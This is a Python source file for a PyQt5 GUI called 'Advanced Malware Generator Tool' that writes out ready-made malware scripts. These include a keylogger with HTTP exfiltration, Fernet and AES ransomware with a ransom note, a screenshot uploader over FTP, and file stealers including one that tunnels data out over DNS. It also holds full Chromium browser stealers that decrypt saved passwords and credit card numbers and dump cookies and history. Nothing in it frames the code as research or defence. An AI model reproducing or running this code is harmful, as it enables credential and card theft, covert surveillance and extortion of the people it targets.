import sys
import os
import shutil
import time
import requests
from datetime import datetime, timedelta
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QPushButton, 
                             QFileDialog, QLabel, QMessageBox, QTextEdit, QHBoxLayout, QInputDialog)
from PyQt5.QtCore import Qt

class MalwareGenerator(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Advanced Malware Generator Tool')
        self.setGeometry(100, 100, 600, 800)

        layout = QVBoxLayout()

        self.label = QLabel('Select malware type to generate:')
        layout.addWidget(self.label)

        self.keyloggerButton = QPushButton('Generate Keylogger', self)
        self.keyloggerButton.clicked.connect(self.generate_keylogger)
        layout.addWidget(self.keyloggerButton)

        self.keyloggerHttpButton = QPushButton('Generate Keylogger with HTTP Exfiltration', self)
        self.keyloggerHttpButton.clicked.connect(self.generate_keylogger_http)
        layout.addWidget(self.keyloggerHttpButton)

        self.ransomwareButton = QPushButton('Generate Ransomware', self)
        self.ransomwareButton.clicked.connect(self.generate_ransomware)
        layout.addWidget(self.ransomwareButton)

        self.ransomwareAesButton = QPushButton('Generate Ransomware with AES and Ransom Note', self)
        self.ransomwareAesButton.clicked.connect(self.generate_ransomware_aes)
        layout.addWidget(self.ransomwareAesButton)

        self.networkButton = QPushButton('Generate Network Communicator', self)
        self.networkButton.clicked.connect(self.generate_network_communicator)
        layout.addWidget(self.networkButton)

        self.networkHttpButton = QPushButton('Generate Network Communicator with HTTP', self)
        self.networkHttpButton.clicked.connect(self.generate_network_communicator_http)
        layout.addWidget(self.networkHttpButton)

        self.screencaptureButton = QPushButton('Generate Screen Capture', self)
        self.screencaptureButton.clicked.connect(self.generate_screencapture)
        layout.addWidget(self.screencaptureButton)

        self.screencaptureFtpButton = QPushButton('Generate Screen Capture with FTP', self)
        self.screencaptureFtpButton.clicked.connect(self.generate_screencapture_ftp)
        layout.addWidget(self.screencaptureFtpButton)

        self.filestealerButton = QPushButton('Generate File Stealer', self)
        self.filestealerButton.clicked.connect(self.generate_filestealer)
        layout.addWidget(self.filestealerButton)

        self.filestealerDnsButton = QPushButton('Generate File Stealer with DNS Tunneling', self)
        self.filestealerDnsButton.clicked.connect(self.generate_filestealer_dns)
        layout.addWidget(self.filestealerDnsButton)

        self.browserDataButton = QPushButton('Generate Browser Data Extractor', self)
        self.browserDataButton.clicked.connect(self.generate_browser_data_extractor)
        layout.addWidget(self.browserDataButton)

        self.browserDataAdvancedButton = QPushButton('Generate Advanced Browser Data Extractor', self)
        self.browserDataAdvancedButton.clicked.connect(self.generate_browser_data_extractor_advanced)
        layout.addWidget(self.browserDataAdvancedButton)

        self.logOutput = QTextEdit(self)
        self.logOutput.setReadOnly(True)
        layout.addWidget(self.logOutput)

        self.clearLogButton = QPushButton('Clear Log', self)
        self.clearLogButton.clicked.connect(self.clear_log)
        layout.addWidget(self.clearLogButton)

        self.setLayout(layout)

    def log(self, message):
        self.logOutput.append(message)

    def clear_log(self):
        self.logOutput.clear()

    def generate_keylogger(self):
        script_content = """
import pynput
from pynput.keyboard import Key, Listener
import logging
import time

log_file = 'key_log.txt'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(f'{key} pressed')

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"""
        self.save_script(script_content, "keylogger.py")

    def generate_keylogger_http(self):
        script_content = """
import pynput
from pynput.keyboard import Key, Listener
import requests
import logging

log_file = 'key_log.txt'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

server_url = 'http://example.com/log'  # Change this to your server URL

def on_press(key):
    logging.info(f'{key} pressed')
    try:
        requests.post(server_url, data={'key': str(key)})
    except Exception as e:
        logging.error(f'Failed to send key to server: {e}')

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"""
        self.save_script(script_content, "keylogger_http.py")

    def generate_ransomware(self):
        script_content = """
from cryptography.fernet import Fernet
import os

# Generate a key and save it to a file
key = Fernet.generate_key()
cipher_suite = Fernet(key)

key_file = 'key.key'
with open(key_file, 'wb') as kf:
    kf.write(key)

def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = cipher_suite.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def decrypt_file(file_path, key):
    cipher = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = cipher.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

file_to_encrypt = 'test.txt'
encrypt_file(file_to_encrypt)

# To decrypt, uncomment the line below and provide the correct key
# decrypt_file(file_to_encrypt, key)
"""
        self.save_script(script_content, "ransomware.py")

    def generate_ransomware_aes(self):
        script_content = """
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
import os

def generate_key():
    return get_random_bytes(32)

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        file_data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(file_data)
    with open(file_path, 'wb') as f:
        for x in (cipher.nonce, tag, ciphertext):
            f.write(x)

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        nonce, tag, ciphertext = [ f.read(x) for x in (16, 16, -1) ]
    cipher = AES.new(key, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)
    with open(file_path, 'wb') as f:
        f.write(data)

key = generate_key()
file_to_encrypt = 'test.txt'
encrypt_file(file_to_encrypt, key)

ransom_note = f'Your files have been encrypted. Use this key to decrypt: {key.hex()}'
with open('ransom_note.txt', 'w') as f:
    f.write(ransom_note)

# To decrypt, use decrypt_file function with the correct key
"""
        self.save_script(script_content, "ransomware_aes.py")

    def generate_network_communicator(self):
        script_content = """
import socket

server_ip = '127.0.0.1'
server_port = 9999

def send_message(message):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    client.send(message.encode())
    response = client.recv(4096)
    client.close()
    return response.decode()

message = 'Hello, Server!'
response = send_message(message)
print(f'Server response: {response}')
"""
        self.save_script(script_content, "network_communicator.py")

    def generate_network_communicator_http(self):
        script_content = """
import requests

server_url = 'http://example.com/log'  # Change this to your server URL

def send_message(message):
    response = requests.post(server_url, data={'message': message})
    return response.text

message = 'Hello, Server!'
response = send_message(message)
print(f'Server response: {response}')
"""
        self.save_script(script_content, "network_communicator_http.py")

    def generate_screencapture(self):
        script_content = """
import time
from PIL import ImageGrab

def capture_screen(interval):
    while True:
        screenshot = ImageGrab.grab()
        timestamp = time.strftime('%Y%m%d%H%M%S')
        screenshot.save(f'screenshot_{timestamp}.png')
        time.sleep(interval)

capture_screen(5)  # Capture every 5 seconds
"""
        interval, ok = QInputDialog.getInt(self, "Input Capture Interval", "Enter capture interval in seconds:", 5, 1, 3600, 1)
        if ok:
            script_content = script_content.replace('capture_screen(5)', f'capture_screen({interval})')
            self.save_script(script_content, "screencapture.py")

    def generate_screencapture_ftp(self):
        script_content = """
import time
from PIL import ImageGrab
from ftplib import FTP

def capture_screen(interval, ftp_details):
    while True:
        screenshot = ImageGrab.grab()
        timestamp = time.strftime('%Y%m%d%H%M%S')
        filename = f'screenshot_{timestamp}.png'
        screenshot.save(filename)
        
        ftp = FTP(ftp_details['host'])
        ftp.login(ftp_details['user'], ftp_details['passwd'])
        with open(filename, 'rb') as f:
            ftp.storbinary(f'STOR {filename}', f)
        ftp.quit()
        
        os.remove(filename)
        time.sleep(interval)

ftp_details = {
    'host': 'ftp.example.com',
    'user': 'username',
    'passwd': 'password'
}
capture_screen(5, ftp_details)  # Capture every 5 seconds
"""
        interval, ok = QInputDialog.getInt(self, "Input Capture Interval", "Enter capture interval in seconds:", 5, 1, 3600, 1)
        if ok:
            script_content = script_content.replace('capture_screen(5, ftp_details)', f'capture_screen({interval}, ftp_details)')
            self.save_script(script_content, "screencapture_ftp.py")

    def generate_filestealer(self):
        script_content = """
import os
import shutil

def steal_files(src_folder, dest_folder, extensions=None, min_size=0):
    if not os.path.exists(dest_folder):
        os.makedirs(dest_folder)
    for root, dirs, files in os.walk(src_folder):
        for file in files:
            full_path = os.path.join(root, file)
            if extensions and not file.endswith(tuple(extensions)):
                continue
            if os.path.getsize(full_path) < min_size:
                continue
            shutil.copy(full_path, dest_folder)

src_folder = 'path_to_steal_from'
dest_folder = 'path_to_save_stolen_files'
extensions = ['.txt', '.pdf']  # Specify file extensions to steal
min_size = 1024  # Specify minimum file size in bytes

steal_files(src_folder, dest_folder, extensions, min_size)
"""
        self.save_script(script_content, "filestealer.py")

    def generate_filestealer_dns(self):
        script_content = """
import os
import base64
import socket

def steal_files_and_exfiltrate(src_folder, extensions=None, min_size=0):
    stolen_data = ''
    for root, dirs, files in os.walk(src_folder):
        for file in files:
            full_path = os.path.join(root, file)
            if extensions and not file.endswith(tuple(extensions)):
                continue
            if os.path.getsize(full_path) < min_size:
                continue
            with open(full_path, 'rb') as f:
                stolen_data += base64.b64encode(f.read()).decode() + '\\n'
    exfiltrate_data_dns(stolen_data)

def exfiltrate_data_dns(data):
    dns_server = 'dns.example.com'
    for chunk in [data[i:i+255] for i in range(0, len(data), 255)]:
        query = chunk + '.' + dns_server
        socket.gethostbyname(query)

src_folder = 'path_to_steal_from'
extensions = ['.txt', '.pdf']  # Specify file extensions to steal
min_size = 1024  # Specify minimum file size in bytes

steal_files_and_exfiltrate(src_folder, extensions, min_size)
"""
        self.save_script(script_content, "filestealer_dns.py")

    def generate_browser_data_extractor(self):
        script_content = """
from win32crypt import CryptUnprotectData
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
import browser_cookie3
import subprocess
import tempfile
import sqlite3
import shutil
import base64
import json
import os

appdata = os.getenv('LOCALAPPDATA')
tempdir = tempfile.gettempdir()

browsers = {
    'avast': appdata + '\\\\AVAST Software\\\\Browser\\\\User Data',
    'amigo': appdata + '\\\\Amigo\\\\User Data',
    'torch': appdata + '\\\\Torch\\\\User Data',
    'kometa': appdata + '\\\\Kometa\\\\User Data',
    'orbitum': appdata + '\\\\Orbitum\\\\User Data',
    'cent-browser': appdata + '\\\\CentBrowser\\\\User Data',
    '7star': appdata + '\\\\7Star\\\\7Star\\\\User Data',
    'sputnik': appdata + '\\\\Sputnik\\\\Sputnik\\\\User Data',
    'vivaldi': appdata + '\\\\Vivaldi\\\\User Data',
    'google-chrome-sxs': appdata + '\\\\Google\\\\Chrome SxS\\\\User Data',
    'google-chrome': appdata + '\\\\Google\\\\Chrome\\\\User Data',
    'epic-privacy-browser': appdata + '\\\\Epic Privacy Browser\\\\User Data',
    'microsoft-edge': appdata + '\\\\Microsoft\\\\Edge\\\\User Data',
    'uran': appdata + '\\\\uCozMedia\\\\Uran\\\\User Data',
    'yandex': appdata + '\\\\Yandex\\\\YandexBrowser\\\\User Data',
    'brave': appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data',
    'iridium': appdata + '\\\\Iridium\\\\User Data',
}

browser_names = {
    'avast': 'avast',
    'amigo': 'amigo',
    'torch': 'torch',
    'kometa': 'kometa',
    'orbitum': 'orbitum',
    'cent-browser': 'centbrowser',
    '7star': '7star',
    'sputnik': 'sputnik',
    'vivaldi': 'vivaldi',
    'google-chrome-sxs': 'chrome-sxs',
    'google-chrome': 'chrome',
    'epic': 'epic',
    'microsoft-edge': 'edge',
    'uran': 'uran',
    'yandex': 'yandex',
    'brave': 'brave',
    'iridium': 'iridium',
}

data_queries = {
    'login_data': {
        'query': 'SELECT origin_url, action_url, username_value, password_value FROM logins',
        'file': '\\\\Login Data',
        'columns': ['Origin URL', 'Action URL', 'Username', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\\\Web Data',
        'columns': ['Name on card', 'Card number', 'Expires', 'Modified'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\\\History',
        'columns': ['URL', 'Title', 'Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\\\History',
        'columns': ['URL', 'Path'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\\\Local State", "r", encoding="utf-8") as f:
        c = f.read()

    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def save_results(browser_name, data_type, content):
    if content is not None:
        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, f"{browser_name}-{data_type}.txt")

        # Check if the file already exists
        if not os.path.exists(file_path):
            with open(file_path, 'w', encoding="utf-8") as file:
                file.write(content)
            print(f"[+] '{data_type}' saved in {file_path}")
        else:
            # Check if the content is not already present in the file
            with open(file_path, 'r', encoding="utf-8") as file:
                existing_content = file.read()

            if content not in existing_content:
                with open(file_path, 'a', encoding="utf-8") as file:
                    file.write(content)
                print(f"[+] '{data_type}' appended to '{file_path}'")
            else:
                print(f"[-] '{data_type}' already exists in '{file_path}'")

def get_data(path: str, profile: str, key, data_type):
    db_file = f'{path}\\\\{profile}{data_type["file"]}'
    if not os.path.exists(db_file):
        return

    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(data_type['query'])

    for row in cursor.fetchall():
        row = list(row)
        if data_type['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)

        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"

        result += "\\n".join([f"{col}: {val}" for col, val in zip(data_type['columns'], row)]) + "\\n\\n"

    conn.close()
    os.remove('temp_db')
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        bn = browser_names[browser]
        try:
            subprocess.run(['taskkill', '/f', '/im', f"{bn}.exe"])
            cj = getattr(browser_cookie3, bn)()

            for cookie in cj:
                if cookie.secure == 1:
                    cookie_secure = True
                else:
                    cookie_secure = False

                content = f"{cookie.domain}\\t{cookie_secure}\\t{cookie.path}\\t{cookie_secure}\\t{cookie.expires}\\t{cookie.name}\\t{cookie.value}\\n"
                save_results(browser, "cookies", content)
        except Exception as e:
            print(e)

        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            try:
                data = get_data(browser_path, "Default", master_key, data_type)
                save_results(browser, data_type_name, data)
            except Exception as e:
                print(e)

            for i in range(1, 51):
                profile = f'Profile {i}'
                try:
                    data = get_data(browser_path, profile, master_key, data_type)
                    save_results(browser, data_type_name, data)
                except Exception as e:
                    print(e)
"""
        self.save_script(script_content, "browser_data_extractor.py")

    def generate_browser_data_extractor_advanced(self):
        script_content = """
from win32crypt import CryptUnprotectData
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
import browser_cookie3
import subprocess
import tempfile
import sqlite3
import shutil
import base64
import json
import os

appdata = os.getenv('LOCALAPPDATA')
tempdir = tempfile.gettempdir()

browsers = {
    'avast': appdata + '\\\\AVAST Software\\\\Browser\\\\User Data',
    'amigo': appdata + '\\\\Amigo\\\\User Data',
    'torch': appdata + '\\\\Torch\\\\User Data',
    'kometa': appdata + '\\\\Kometa\\\\User Data',
    'orbitum': appdata + '\\\\Orbitum\\\\User Data',
    'cent-browser': appdata + '\\\\CentBrowser\\\\User Data',
    '7star': appdata + '\\\\7Star\\\\7Star\\\\User Data',
    'sputnik': appdata + '\\\\Sputnik\\\\Sputnik\\\\User Data',
    'vivaldi': appdata + '\\\\Vivaldi\\\\User Data',
    'google-chrome-sxs': appdata + '\\\\Google\\\\Chrome SxS\\\\User Data',
    'google-chrome': appdata + '\\\\Google\\\\Chrome\\\\User Data',
    'epic-privacy-browser': appdata + '\\\\Epic Privacy Browser\\\\User Data',
    'microsoft-edge': appdata + '\\\\Microsoft\\\\Edge\\\\User Data',
    'uran': appdata + '\\\\uCozMedia\\\\Uran\\\\User Data',
    'yandex': appdata + '\\\\Yandex\\\\YandexBrowser\\\\User Data',
    'brave': appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data',
    'iridium': appdata + '\\\\Iridium\\\\User Data',
}

browser_names = {
    'avast': 'avast',
    'amigo': 'amigo',
    'torch': 'torch',
    'kometa': 'kometa',
    'orbitum': 'orbitum',
    'cent-browser': 'centbrowser',
    '7star': '7star',
    'sputnik': 'sputnik',
    'vivaldi': 'vivaldi',
    'google-chrome-sxs': 'chrome-sxs',
    'google-chrome': 'chrome',
    'epic': 'epic',
    'microsoft-edge': 'edge',
    'uran': 'uran',
    'yandex': 'yandex',
    'brave': 'brave',
    'iridium': 'iridium',
}

data_queries = {
    'login_data': {
        'query': 'SELECT origin_url, action_url, username_value, password_value FROM logins',
        'file': '\\\\Login Data',
        'columns': ['Origin URL', 'Action URL', 'Username', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\\\Web Data',
        'columns': ['Name on card', 'Card number', 'Expires', 'Modified'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\\\History',
        'columns': ['URL', 'Title', 'Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\\\History',
        'columns': ['URL', 'Path'],
        'decrypt': False
    },
    'bookmarks': {
        'query': 'SELECT date_added, name, url FROM bookmarks',
        'file': '\\\\Bookmarks',
        'columns': ['Date Added', 'Name', 'URL'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\\\Local State", "r", encoding="utf-8") as f:
        c = f.read()

    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def save_results(browser_name, data_type, content):
    if content is not None:
        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, f"{browser_name}-{data_type}.txt")

        # Check if the file already exists
        if not os.path.exists(file_path):
            with open(file_path, 'w', encoding="utf-8") as file:
                file.write(content)
            print(f"[+] '{data_type}' saved in {file_path}")
        else:
            # Check if the content is not already present in the file
            with open(file_path, 'r', encoding="utf-8") as file:
                existing_content = file.read()

            if content not in existing_content:
                with open(file_path, 'a', encoding="utf-8") as file:
                    file.write(content)
                print(f"[+] '{data_type}' appended to '{file_path}'")
            else:
                print(f"[-] '{data_type}' already exists in '{file_path}'")

def get_data(path: str, profile: str, key, data_type):
    db_file = f'{path}\\\\{profile}{data_type["file"]}'
    if not os.path.exists(db_file):
        return

    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(data_type['query'])

    for row in cursor.fetchall():
        row = list(row)
        if data_type['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)

        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"

        result += "\\n".join([f"{col}: {val}" for col, val in zip(data_type['columns'], row)]) + "\\n\\n"

    conn.close()
    os.remove('temp_db')
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        bn = browser_names[browser]
        try:
            subprocess.run(['taskkill', '/f', '/im', f"{bn}.exe"])
            cj = getattr(browser_cookie3, bn)()

            for cookie in cj:
                if cookie.secure == 1:
                    cookie_secure = True
                else:
                    cookie_secure = False

                content = f"{cookie.domain}\\t{cookie_secure}\\t{cookie.path}\\t{cookie_secure}\\t{cookie.expires}\\t{cookie.name}\\t{cookie.value}\\n"
                save_results(browser, "cookies", content)
        except Exception as e:
            print(e)

        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            try:
                data = get_data(browser_path, "Default", master_key, data_type)
                save_results(browser, data_type_name, data)
            except Exception as e:
                print(e)

            for i in range(1, 51):
                profile = f'Profile {i}'
                try:
                    data = get_data(browser_path, profile, master_key, data_type)
                    save_results(browser, data_type_name, data)
                except Exception as e:
                    print(e)
"""
        self.save_script(script_content, "browser_data_extractor_advanced.py")

    def save_script(self, script_content, file_name):
        options = QFileDialog.Options()
        save_path, _ = QFileDialog.getSaveFileName(self, "Save Script", file_name, "Python Files (*.py);;All Files (*)", options=options)
        if save_path:
            with open(save_path, 'w') as file:
                file.write(script_content)
            QMessageBox.information(self, "Success", f'Script saved to {save_path}')
            self.log(f'Script {file_name} saved to {save_path}')

def main():
    app = QApplication(sys.argv)
    ex = MalwareGenerator()
    ex.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
